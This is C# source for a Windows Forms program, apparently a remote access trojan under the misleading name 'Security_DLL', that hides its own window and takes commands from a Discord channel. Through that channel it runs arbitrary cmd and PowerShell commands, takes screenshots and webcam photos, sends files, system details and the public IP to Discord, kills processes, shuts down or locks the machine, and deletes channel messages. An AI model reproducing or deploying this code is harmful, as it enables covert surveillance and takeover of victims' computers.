using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace Security_DLL
{
    public partial class Form1 : Form
    {
        private System.Timers.Timer timerComandos;
        private static string ultimoMensaje = "";
        private static readonly string BotToken = ""; // ¡REEMPLAZA CON TU TOKEN DE TU BOT
        private static readonly ulong CanalID = 0;
        private HttpClient client;
        private string botId = "";

        public Form1()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();
            this.Opacity = 0;
            client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            Console.WriteLine("=== INICIANDO BOT ===");
            await ObtenerBotId();
            await EnviarMensaje("✅ **Bot conectado y funcionando!**");
            await EnviarMensaje("💡 **Usa !help, /helppc o /mpchelp para ver los comandos disponibles**");
            IniciarListener();
        }

        private async Task ObtenerBotId()
        {
            try
            {
                var response = await client.GetAsync("https://discord.com/api/v10/users/@me");
                if (response.IsSuccessStatusCode)
                {
                    string json = await response.Content.ReadAsStringAsync();
                    dynamic data = JsonConvert.DeserializeObject(json);
                    botId = data.id.ToString();
                    Console.WriteLine($"✅ Bot ID: {botId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error obteniendo ID: {ex.Message}");
            }
        }

        private void IniciarListener()
        {
            timerComandos = new System.Timers.Timer(3000);
            timerComandos.Elapsed += async (s, ev) => await LeerComandos();
            timerComandos.Start();
            Console.WriteLine("📡 Escuchando comandos...");
        }

        private async Task LeerComandos()
        {
            try
            {
                string url = $"https://discord.com/api/v10/channels/{CanalID}/messages?limit=2";
                var response = await client.GetAsync(url);

                if (response.IsSuccessStatusCode)
                {
                    string json = await response.Content.ReadAsStringAsync();
                    dynamic mensajes = JsonConvert.DeserializeObject(json);

                    if (mensajes != null && mensajes.Count > 0)
                    {
                        foreach (var msg in mensajes)
                        {
                            string autorId = msg.author.id.ToString();
                            string contenido = msg.content.ToString();
                            string msgId = msg.id.ToString();

                            if (autorId != botId && msgId != ultimoMensaje)
                            {
                                ultimoMensaje = msgId;
                                Console.WriteLine($"📨 Comando: {contenido}");
                                await ProcesarComando(contenido);
                                break;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private async Task ProcesarComando(string comando)
        {
            string cmd = comando.ToLower().Trim();

            // ==================== COMANDOS ! ====================
            if (cmd == "!help")
            {
                string ayuda = @"
**📋 COMANDOS DISPONIBLES:**

**!test** - Prueba el bot
**!close** - Cierra la aplicación
**!info** - Información del sistema
**!ip** - IP pública
**!pantalla** - Captura de pantalla
**!procesos** - Lista procesos activos
**!users** - Usuarios del sistema
**!clear** - Limpia el canal

**Control PC:**
**!cmd ipconfig** - Ejecuta CMD
**!apagar** - Apaga PC
**!reiniciar** - Reinicia PC
**!bloquear** - Bloquea pantalla
**!notepad** - Abre bloc de notas
**!calc** - Abre calculadora

**Usa /helppc o /mpchelp para más comandos avanzados**";
                await EnviarMensaje(ayuda);
            }
            else if (cmd == "!test")
            {
                await EnviarMensaje("✅ **Bot funcionando correctamente!**");
            }
            else if (cmd == "!close")
            {
                await EnviarMensaje("🔒 Cerrando aplicación...");
                await Task.Delay(1000);
                Environment.Exit(0);
            }
            else if (cmd == "!info")
            {
                string info = $"**PC:** {Environment.MachineName}\n**Usuario:** {Environment.UserName}\n**SO:** {Environment.OSVersion}\n**Hora:** {DateTime.Now}";
                await EnviarMensaje(info);
            }
            else if (cmd == "!ip")
            {
                string ip = await ObtenerIP();
                await EnviarMensaje($"🌐 **IP Pública:** {ip}");
            }
            else if (cmd == "!pantalla")
            {
                await EnviarMensaje("📸 Tomando captura...");
                await TomarCapturaPantalla();
            }
            else if (cmd == "!procesos")
            {
                await ManejoPC.EjecutarComando("/mpc procesos");
            }
            else if (cmd == "!users")
            {
                await ManejoPC.EjecutarComando("/mpc usuarios");
            }
            else if (cmd == "!clear")
            {
                await LimpiarCanal();
            }
            else if (cmd == "!apagar")
            {
                await ManejoPC.EjecutarComando("/mpc apagar");
            }
            else if (cmd == "!reiniciar")
            {
                await ManejoPC.EjecutarComando("/mpc reiniciar");
            }
            else if (cmd == "!bloquear")
            {
                await ManejoPC.EjecutarComando("/mpc bloquear");
            }
            else if (cmd == "!notepad")
            {
                System.Diagnostics.Process.Start("notepad.exe");
                await EnviarMensaje("✅ Bloc de notas abierto");
            }
            else if (cmd == "!calc")
            {
                System.Diagnostics.Process.Start("calc.exe");
                await EnviarMensaje("✅ Calculadora abierta");
            }
            else if (cmd.StartsWith("!cmd "))
            {
                string comandoCMD = comando.Substring(5);
                await ManejoPC.EjecutarComando($"/mpc cmd {comandoCMD}");
            }

            // ==================== COMANDOS / (ControlPC) ====================
            else if (cmd == "/helppc" || cmd == "/help")
            {
                await EnviarAyudaControlPC();
            }
            else if (cmd == "/info")
            {
                await ManejoPC.EjecutarComando("/mpc info");
            }
            else if (cmd == "/ip")
            {
                string ip = await ObtenerIP();
                await EnviarMensaje($"🌐 **IP Pública:** {ip}");
            }
            else if (cmd == "/apagar")
            {
                await ManejoPC.EjecutarComando("/mpc apagar");
            }
            else if (cmd == "/reiniciar")
            {
                await ManejoPC.EjecutarComando("/mpc reiniciar");
            }
            else if (cmd == "/bloquear")
            {
                await ManejoPC.EjecutarComando("/mpc bloquear");
            }
            else if (cmd == "/screenshot")
            {
                await TomarCapturaPantalla();
            }
            else if (cmd == "/webcam")
            {
                await EnviarMensaje("📸 Tomando foto de cámara...");
                await FotoCam.TomarFotoYEnviar();
            }
            else if (cmd.StartsWith("/cmd "))
            {
                string comandoCMD = comando.Substring(5);
                await ManejoPC.EjecutarComando($"/mpc cmd {comandoCMD}");
            }
            else if (cmd.StartsWith("/powershell "))
            {
                string psComando = comando.Substring(12);
                await ManejoPC.EjecutarComando($"/mpc powershell {psComando}");
            }

            // ==================== COMANDOS /mpc (ManejoPC - TODOS) ====================
            else if (cmd == "/mpchelp" || cmd == "manejohelp")
            {
                await ManejoPC.MostrarAyuda();
            }
            else if (cmd.StartsWith("/mpc "))
            {
                await ManejoPC.EjecutarComando(comando);
            }

            // ==================== COMANDO DESCONOCIDO ====================
            else if (!string.IsNullOrEmpty(cmd) && (cmd.StartsWith("!") || cmd.StartsWith("/")))
            {
                await EnviarMensaje($"❌ Comando no reconocido: `{cmd}`\nUsa `!help`, `/helppc` o `/mpchelp` para ver comandos");
            }
        }

        // ==================== FUNCIONES DE AYUDA ====================
        private async Task EnviarAyudaControlPC()
        {
            string ayuda = @"
**🖥️ COMANDOS DE CONTROL PC**

**🔹 BÁSICOS:**
`/info` - Info del sistema
`/ip` - IP pública

**🔹 CONTROL:**
`/apagar` - Apaga PC
`/reiniciar` - Reinicia PC
`/bloquear` - Bloquea pantalla

**🔹 CAPTURA:**
`/screenshot` - Captura pantalla
`/webcam` - Foto cámara

**🔹 COMANDOS CMD:**
`/cmd ipconfig` - Ejecuta CMD
`/powershell Get-Process` - Ejecuta PowerShell

**🔹 MANEJO PC (COMANDOS AVANZADOS):**
`/mpchelp` - Muestra TODOS los comandos de ManejoPC
`/mpc listar C:\` - Lista archivos
`/mpc enviar C:\archivo` - Envía archivo
`/mpc procesos` - Lista procesos
`/mpc matar 1234` - Mata proceso
`/mpc escribir Hola` - Escribe texto
`/mpc click` - Click mouse
`/mpc volumen 50` - Cambia volumen
`/mpc wallpaper C:\foto.jpg` - Cambia fondo
`/mpc usuarios` - Lista usuarios
`/mpc wifi` - Lista redes WiFi
`/mpc cmd ipconfig` - Ejecuta CMD

**Usa /mpchelp para ver TODOS los comandos disponibles**";
            await EnviarMensaje(ayuda);
        }

        // ==================== FUNCIONES PROPIAS ====================
        private async Task TomarCapturaPantalla()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                using (var bmp = new Bitmap(bounds.Width, bounds.Height))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                    string temp = Path.GetTempFileName() + ".jpg";
                    bmp.Save(temp, System.Drawing.Imaging.ImageFormat.Jpeg);
                    await EnviarArchivoADiscord(temp);
                    File.Delete(temp);
                    await EnviarMensaje("✅ Captura enviada");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private async Task LimpiarCanal()
        {
            try
            {
                string url = $"https://discord.com/api/v10/channels/{CanalID}/messages?limit=50";
                var response = await client.GetAsync(url);

                if (response.IsSuccessStatusCode)
                {
                    string json = await response.Content.ReadAsStringAsync();
                    dynamic mensajes = JsonConvert.DeserializeObject(json);
                    int count = 0;

                    foreach (var msg in mensajes)
                    {
                        string id = msg.id.ToString();
                        string deleteUrl = $"https://discord.com/api/v10/channels/{CanalID}/messages/{id}";
                        await client.DeleteAsync(deleteUrl);
                        count++;
                        await Task.Delay(300);
                    }
                    await EnviarMensajeTemporal($"✅ Eliminados {count} mensajes", 3);
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        // ==================== FUNCIONES UTILITARIAS ====================
        private async Task<string> ObtenerIP()
        {
            try
            {
                using (var web = new System.Net.WebClient())
                    return await web.DownloadStringTaskAsync("https://api.ipify.org");
            }
            catch { return "No disponible"; }
        }

        private async Task EnviarMensajeTemporal(string msg, int seg)
        {
            try
            {
                var payload = new { content = msg };
                string json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", content);

                if (response.IsSuccessStatusCode)
                {
                    string respJson = await response.Content.ReadAsStringAsync();
                    dynamic mensaje = JsonConvert.DeserializeObject(respJson);
                    string id = mensaje.id.ToString();
                    await Task.Delay(seg * 1000);
                    await client.DeleteAsync($"https://discord.com/api/v10/channels/{CanalID}/messages/{id}");
                }
            }
            catch { }
        }

        private async Task EnviarMensaje(string mensaje)
        {
            try
            {
                var payload = new { content = mensaje };
                string json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", content);
                Console.WriteLine($"📤 Enviado: {mensaje.Substring(0, Math.Min(50, mensaje.Length))}...");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private async Task EnviarArchivoADiscord(string ruta)
        {
            try
            {
                byte[] data = File.ReadAllBytes(ruta);
                using (var form = new MultipartFormDataContent())
                {
                    var file = new ByteArrayContent(data);
                    file.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                    form.Add(file, "file", Path.GetFileName(ruta));
                    await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", form);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            timerComandos?.Stop();
            timerComandos?.Dispose();
            client?.Dispose();
            base.OnFormClosed(e);
        }
    }
}